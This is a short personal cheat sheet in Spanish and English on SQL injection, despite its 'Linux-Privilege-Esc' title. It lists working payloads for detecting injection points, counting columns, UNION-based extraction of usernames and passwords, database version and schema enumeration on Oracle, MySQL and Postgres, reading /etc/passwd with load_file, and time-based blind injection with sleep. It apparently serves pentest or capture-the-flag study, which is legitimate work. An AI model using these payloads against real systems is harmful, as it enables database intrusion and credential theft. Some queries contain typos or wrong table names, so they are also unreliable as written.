# Linux-Privilege-Esc

SQL INJECTION
**Syntax**
1. SELECT USERNAMES,PASSWORD FROM **TABLE** WHERE ID=X
2. SELECT * FROM **TABLE** //Select all 

**Como IDENTIFICAR**
>1. ' = file?products=Gifts' = ERROR SYNTAX OR 500 INTERNAL ERROR

**DETECTING NUMBER OF COLUMNS**
>1. ORDER BY 1--+    #True
>2. order BY 2--     #True
>3. ORDER BY 3-- -   #True
>4. ORDER BY 4-- -   #False
* The database has 3
           GROUP BY x 
           UNION SELECT NULL,NULL,NULL -- -

**EXTRAER DATA**

> 1. union select NULL,USERNAME,PASSWORD FROM ***TABLE***


***VERSION DE LA BASE Y CONTENIDO***

**Base Version**
*Oracle* 

        SELECT banner FROM v$version
        
        SELECT version FROM v$instance
> *Microsoft and MySQl* 

         version@@
> *Postgres*

        version()
    
**Contenidos**
> 1. union select null,schema_name from information_schema.schemata
> 2. union select null,table_name from infomrmation_schema.tables where table_schema = 'Nombre de la data base'
> 3. union select null,column_name from information_schema.tables where table_name = 'Table name'
> 4. union select x,y from table_nmae
* **ORACLE TYPE**
> 1. union select distinct owner,null from all_tables
> 2. union select owner,table_name from all_tables
> 3. union select column_name,null from all_tab_columns where table_name = 'Nombre de la tabla'
> 4. union select x,y from table_name

**Cheatsheets**
> 1.union select null, version() / Version de la SQL
> 2.union select null,user() / Quien esta usando la base de datos
> 3.union select null,load_file("/etc/passwd")
> 4.union select null,database() / te nombra la base de datos en uso

**Bypass**
> Convertir en Hex tables_schema 

**Blind SQLi**
    Base de datos = Colegio
> 1. union select null, and if(substr(database(),1,1)='c',sleep(5),1);
        Estamos comprobando con la funcion de substr el nombre de la base de datos si empieza por la 'c' y si empieza por la 'c' que tarde 5 segundos en respondernos. Para el segundo valor seria if(substr(database(),2,1)='o',sleep(5),1);

